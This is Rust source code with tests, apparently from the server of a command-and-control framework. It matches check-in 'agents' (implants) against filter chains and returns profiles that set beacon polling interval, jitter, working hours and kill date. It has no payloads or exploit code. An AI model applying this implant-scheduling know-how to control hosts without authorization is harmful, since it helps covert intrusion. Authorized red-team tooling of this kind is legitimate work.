//! Evaluate the agent profiles and return the configuration profile to apply to the agent

use std::time::Duration;

use chrono::{DateTime, NaiveTime, Timelike as _};
use kageshirei_communication_protocol::communication::CheckinResponse;
use srv_mod_entity::{
    active_enums::{FilterOperation, LogicalOperator},
    entities::{agent, agent_profile, filter},
    sea_orm::{prelude::*, DatabaseConnection, QueryOrder as _},
};

/// The result of a group evaluation
struct GroupEvaluationResult {
    /// The result of the group evaluation
    result:   bool,
    /// The next_hop_relation to apply to the next filter if any
    next_hop: Option<LogicalOperator>,
    /// The number of hops to skip
    hops:     usize,
}

/// Evaluate a filter and return the result
fn evaluate_filter(agent: &agent::Model, filter: &filter::Model) -> bool {
    match filter.filter_op {
        FilterOperation::Equals => {
            let v: String = agent.get(filter.agent_field.clone().into()).unwrap();
            v.as_str().eq(filter.value.as_str().unwrap_or_default())
        },
        FilterOperation::NotEquals => {
            let v: String = agent.get(filter.agent_field.clone().into()).unwrap();
            v.as_str().ne(filter.value.as_str().unwrap_or_default())
        },
        FilterOperation::Contains => {
            let v: String = agent.get(filter.agent_field.clone().into()).unwrap();
            v.contains(filter.value.as_str().unwrap_or_default())
        },
        FilterOperation::NotContains => {
            let v: String = agent.get(filter.agent_field.clone().into()).unwrap();
            !v.contains(filter.value.as_str().unwrap_or_default())
        },
        FilterOperation::StartsWith => {
            let v: String = agent.get(filter.agent_field.clone().into()).unwrap();
            v.starts_with(filter.value.as_str().unwrap_or_default())
        },
        FilterOperation::EndsWith => {
            let v: String = agent.get(filter.agent_field.clone().into()).unwrap();
            v.ends_with(filter.value.as_str().unwrap_or_default())
        },
    }
}

/// Combine the results of a filter with the next_hop_relation
const fn combine_results(result: Option<bool>, next_hop: Option<&LogicalOperator>, intermediary_result: bool) -> bool {
    if result.is_none() {
        return intermediary_result;
    }

    if next_hop.is_none() {
        return intermediary_result;
    }

    match *next_hop.unwrap() {
        LogicalOperator::And => result.unwrap() && intermediary_result,
        LogicalOperator::Or => result.unwrap() || intermediary_result,
    }
}

/// Evaluate a group of filters and exits returning the result once a group end is found or the
/// filters are exhausted
fn evaluate_group(agent: &agent::Model, filters: Vec<filter::Model>, index: usize) -> GroupEvaluationResult {
    // init the result container
    let mut result: Option<bool> = None;
    let mut next_hop: Option<LogicalOperator> = None;
    let original_index = index;
    let mut i = index;

    while i < filters.len() {
        let filter = &filters.get(i);

        // if the filter is None, skip to the next filter
        if filter.is_none() {
            i = i.saturating_add(1);
            continue;
        }
        let filter = filter.unwrap();

        let intermediary_result: bool;
        let mut pending_next_hop: Option<LogicalOperator> = None;

        if filter.grouping_start {
            let group_start_result = evaluate_filter(agent, filter);
            let evaluation_result = evaluate_group(agent, filters.clone(), i.saturating_add(1));
            intermediary_result = combine_results(
                Some(group_start_result),
                filter.next_hop_relation.as_ref(),
                evaluation_result.result,
            );
            pending_next_hop = evaluation_result.next_hop;

            // skip the hops already evaluated
            i = i.saturating_add(evaluation_result.hops);
        }
        else {
            // apply the filter
            intermediary_result = evaluate_filter(agent, filter);
        }

        // if the result is None, set the result to the intermediary result
        if result.is_none() {
            result = Some(intermediary_result);
        }
        else {
            result = Some(combine_results(
                result,
                next_hop.as_ref(),
                intermediary_result,
            ));
        }

        if pending_next_hop.is_some() {
            next_hop = pending_next_hop.clone();
        }
        else {
            // if the filter has a next_hop_relation, set the next_hop_relation to the filter's
            // next_hop_relation
            if filter.next_hop_relation.is_some() {
                next_hop = filter.next_hop_relation.clone();
                pending_next_hop = filter.next_hop_relation.clone();
            }
        }

        // if the group ends, return the result, group ending has precedence over the next_hop_relation,
        // this means that (random_queries... and) equals (random_queries...)
        if filter.grouping_end {
            return GroupEvaluationResult {
                result:   result.unwrap_or(false),
                next_hop: pending_next_hop,
                hops:     i.saturating_add(1).saturating_sub(original_index),
            };
        }

        i = i.saturating_add(1);
    }

    // if the group ends, return the result
    GroupEvaluationResult {
        result:   result.unwrap_or(false),
        next_hop: None,
        hops:     filters.len().saturating_sub(original_index),
    }
}

/// Convert a NaiveTime to seconds since midnight
fn seconds_since_midnight(time: &NaiveTime) -> i64 {
    (time
        .hour()
        .saturating_mul(3600)
        .saturating_add(time.minute().saturating_mul(60))
        .saturating_add(time.second())) as i64
}

/// Apply filters to the agent and return the configuration profile
pub async fn apply_filters(agent: &agent::Model, db_pool: DatabaseConnection) -> CheckinResponse {
    let db = db_pool.clone();

    // get all the agent profiles, ordered by creation date, descending, so the latest profile is first
    let available_profiles = agent_profile::Entity::find()
        .order_by_desc(agent_profile::Column::CreatedAt)
        .all(&db)
        .await;

    // if there are no profiles or an error occurred, return the default values
    if available_profiles.is_err() || available_profiles.as_ref().unwrap().is_empty() {
        // TODO: Load the default configuration from the configuration file
        return CheckinResponse {
            id:               agent.id.clone(),
            working_hours:    None,
            kill_date:        None,
            polling_jitter:   10_000, // 10 seconds of jitter (polling range from 20 to 40 seconds)
            polling_interval: 30_000, // 30 seconds of polling interval
        };
    }

    let available_profiles = available_profiles.unwrap();

    for profile in available_profiles.iter() {
        let profile_filters = filter::Entity::find()
            .filter(filter::Column::AgentProfileId.eq(profile.id.clone()))
            .order_by_asc(filter::Column::Sequence)
            .all(&db)
            .await
            .unwrap();

        // if the result is Some, return the profile configuration
        let final_result = evaluate_group(agent, profile_filters, 0);
        if final_result.result {
            return CheckinResponse {
                id:               agent.id.clone(),
                working_hours:    profile.working_hours.as_ref().map(|v| {
                    v.iter()
                        .map(|v| Some(seconds_since_midnight(v)))
                        .collect::<Vec<_>>()
                }),
                kill_date:        profile.kill_date.as_ref().map(|v| {
                    DateTime::<chrono::offset::Utc>::from_naive_utc_and_offset(*v, chrono::offset::Utc).timestamp()
                }),
                polling_jitter:   profile
                    .get_polling_jitter()
                    .unwrap()//_or(Duration::from_secs(10))
                    .as_millis(),
                polling_interval: profile
                    .get_polling_interval()
                    .unwrap_or(Duration::from_secs(30))
                    .as_millis(),
            };
        }
    }

    // fallback return type if none of the filters match
    // TODO: Load the fallback configuration from the default one defined in the configuration file
    CheckinResponse {
        id:               agent.id.clone(),
        working_hours:    None,
        kill_date:        None,
        polling_jitter:   10_000, // 10 seconds of jitter (polling range from 20 to 40 seconds)
        polling_interval: 30_000, // 30 seconds of polling interval
    }
}

#[cfg(test)]
mod test {
    use std::time::Duration;

    use chrono::{NaiveTime, Utc};
    use kageshirei_communication_protocol::{NetworkInterface, NetworkInterfaceArray};
    use srv_mod_entity::{
        active_enums::{AgentField, AgentIntegrity, FilterOperation},
        entities::{agent, agent_profile, filter},
        sea_orm::{ActiveValue, Database, TransactionTrait},
    };

    use super::*;

    async fn cleanup(db: DatabaseConnection) {
        db.transaction::<_, (), DbErr>(|txn| {
            Box::pin(async move {
                agent::Entity::delete_many().exec(txn).await.unwrap();
                agent_profile::Entity::delete_many()
                    .exec(txn)
                    .await
                    .unwrap();
                filter::Entity::delete_many().exec(txn).await.unwrap();

                Ok(())
            })
        })
        .await
        .unwrap();
    }

    async fn init() -> DatabaseConnection {
        let db_pool = Database::connect("postgresql://kageshirei:kageshirei@localhost/kageshirei")
            .await
            .unwrap();

        cleanup(db_pool.clone()).await;

        let agent = agent::Entity::insert(agent::ActiveModel {
            id:                 ActiveValue::Set("agent1".to_owned()),
            pid:                ActiveValue::Set(1),
            secret:             ActiveValue::Set("test".to_owned()),
            cwd:                ActiveValue::Set("test".to_owned()),
            server_secret:      ActiveValue::Set("test".to_owned()),
            operating_system:   ActiveValue::Set("test".to_owned()),
            integrity:          ActiveValue::Set(AgentIntegrity::Medium),
            updated_at:         ActiveValue::Set(Utc::now().naive_utc()),
            domain:             ActiveValue::Set(Some("test".to_owned())),
            hostname:           ActiveValue::Set("test-hostname".to_owned()),
            network_interfaces: ActiveValue::Set(NetworkInterfaceArray {
                network_interfaces: vec![NetworkInterface {
                    name:        Some("test".to_owned()),
                    dhcp_server: Some("test".to_owned()),
                    address:     Some("test".to_owned()),
                }],
            }),
            ppid:               ActiveValue::Set(1),
            username:           ActiveValue::Set("test".to_owned()),
            process_name:       ActiveValue::Set("test".to_owned()),
            signature:          ActiveValue::Set("test".to_owned()),
            terminated_at:      ActiveValue::Set(None),
            created_at:         ActiveValue::Set(Utc::now().naive_utc()),
        })
        .exec_with_returning(&db_pool)
        .await
        .unwrap();

        agent_profile::Entity::insert(agent_profile::ActiveModel {
            id:               ActiveValue::Set("profile123".to_owned()),
            name:             ActiveValue::Set("test-profile".to_owned()),
            working_hours:    ActiveValue::Set(Some(vec![
                NaiveTime::from_hms_opt(9, 0, 0).unwrap(),
                NaiveTime::from_hms_opt(18, 0, 0).unwrap(),
            ])),
            kill_date:        ActiveValue::Set(Some(
                DateTimeUtc::from_timestamp(1_700_000_000, 0)
                    .unwrap()
                    .naive_utc(),
            )),
            polling_jitter:   ActiveValue::Set(humantime::format_duration(Duration::from_secs(20)).to_string()),
            polling_interval: ActiveValue::Set(humantime::format_duration(Duration::from_secs(20)).to_string()),
            created_at:       ActiveValue::Set(Utc::now().naive_utc()),
            updated_at:       ActiveValue::Set(Utc::now().naive_utc()),
        })
        .exec(&db_pool)
        .await
        .unwrap();

        db_pool
    }

    #[tokio::test]
    #[serial_test::serial]
    async fn test_apply_filters_no_profiles() {
        let db = init().await;
        let agent_model = agent::Entity::find().one(&db).await.unwrap().unwrap();

        let response = apply_filters(&agent_model, db).await;

        assert_eq!(response.id, "agent1");
        assert_eq!(response.working_hours, None);
        assert_eq!(response.kill_date, None);
        assert_eq!(response.polling_jitter, 10_000); // 10 seconds
        assert_eq!(response.polling_interval, 30_000); // 30 seconds
    }

    #[tokio::test]
    #[serial_test::serial]
    async fn test_apply_filters_matching_profile() {
        let db_pool = init().await;

        filter::Entity::insert(filter::ActiveModel {
            id:                ActiveValue::Set("filter123".to_string()),
            agent_profile_id:  ActiveValue::Set("profile123".to_owned()),
            agent_field:       ActiveValue::Set(AgentField::Hostname),
            filter_op:         ActiveValue::Set(FilterOperation::Equals),
            value:             ActiveValue::Set(serde_json::Value::String("test-hostname".to_owned())),
            sequence:          ActiveValue::Set(1),
            next_hop_relation: ActiveValue::Set(None),
            grouping_start:    ActiveValue::Set(false),
            grouping_end:      ActiveValue::Set(false),
            created_at:        ActiveValue::Set(Utc::now().naive_utc()),
            updated_at:        ActiveValue::Set(Utc::now().naive_utc()),
        })
        .exec(&db_pool)
        .await
        .unwrap();

        let agent_model = agent::Entity::find().one(&db_pool).await.unwrap().unwrap();

        let response = apply_filters(&agent_model, db_pool).await;

        assert_eq!(response.id, "agent1");
        let working_hours = response.working_hours.unwrap();
        assert_eq!(
            working_hours[0].unwrap(),
            seconds_since_midnight(&NaiveTime::from_hms_opt(9, 0, 0).unwrap())
        );
        assert_eq!(
            working_hours[1].unwrap(),
            seconds_since_midnight(&NaiveTime::from_hms_opt(18, 0, 0).unwrap()),
        );
        assert_eq!(response.kill_date.unwrap(), 1_700_000_000);
        assert_eq!(response.polling_jitter, 20_000);
        assert_eq!(response.polling_interval, 20_000);
    }

    #[tokio::test]
    async fn test_seconds_since_midnight() {
        let time = NaiveTime::from_hms_opt(14, 30, 45).unwrap(); // 2:30:45 PM
        let seconds = seconds_since_midnight(&time);
        assert_eq!(seconds, 14 * 3600 + 30 * 60 + 45);
    }

    #[tokio::test]
    #[serial_test::serial]
    async fn test_evaluate_filter_equals() {
        let db_pool = init().await;
        let agent_model = agent::Entity::find().one(&db_pool).await.unwrap().unwrap();

        let filter = filter::Model {
            id:                "filter123".to_string(),
            agent_profile_id:  "profile123".to_owned(),
            agent_field:       AgentField::Hostname,
            filter_op:         FilterOperation::Equals,
            value:             serde_json::Value::String("test-hostname".to_owned()),
            sequence:          1,
            next_hop_relation: None,
            grouping_start:    false,
            grouping_end:      false,
            created_at:        Utc::now().naive_utc(),
            updated_at:        Utc::now().naive_utc(),
        };

        let result = evaluate_filter(&agent_model, &filter);
        assert!(result);
    }

    #[tokio::test]
    #[serial_test::serial]
    async fn test_evaluate_filter_not_equals() {
        let db_pool = init().await;
        let agent_model = agent::Entity::find().one(&db_pool).await.unwrap().unwrap();

        let filter = filter::Model {
            id:                "filter123".to_string(),
            agent_profile_id:  "profile123".to_owned(),
            agent_field:       AgentField::Hostname,
            filter_op:         FilterOperation::NotEquals,
            value:             serde_json::Value::String("other-agent".to_owned()),
            sequence:          1,
            next_hop_relation: None,
            grouping_start:    false,
            grouping_end:      false,
            created_at:        Utc::now().naive_utc(),
            updated_at:        Utc::now().naive_utc(),
        };

        let result = evaluate_filter(&agent_model, &filter);
        assert!(result);
    }

    #[tokio::test]
    #[serial_test::serial]
    async fn test_evaluate_group_simple() {
        let db_pool = init().await;
        let agent_model = agent::Entity::find().one(&db_pool).await.unwrap().unwrap();

        let filters = vec![
            filter::Model {
                id:                "filter123".to_string(),
                agent_profile_id:  "profile123".to_owned(),
                agent_field:       AgentField::Hostname,
                filter_op:         FilterOperation::NotEquals,
                value:             serde_json::Value::String("other-agent".to_owned()),
                sequence:          1,
                grouping_start:    true,
                next_hop_relation: Some(LogicalOperator::And),
                grouping_end:      false,
                created_at:        Utc::now().naive_utc(),
                updated_at:        Utc::now().naive_utc(),
            },
            filter::Model {
                id:                "filter124".to_string(),
                agent_profile_id:  "profile123".to_owned(),
                agent_field:       AgentField::Hostname,
                filter_op:         FilterOperation::Equals,
                value:             serde_json::Value::String("test-hostname".to_owned()),
                sequence:          2,
                grouping_end:      true,
                next_hop_relation: None,
                grouping_start:    false,
                created_at:        Utc::now().naive_utc(),
                updated_at:        Utc::now().naive_utc(),
            },
        ];

        let result = evaluate_group(&agent_model, filters, 0);
        assert!(result.result);
        assert_eq!(result.hops, 2);
    }
}
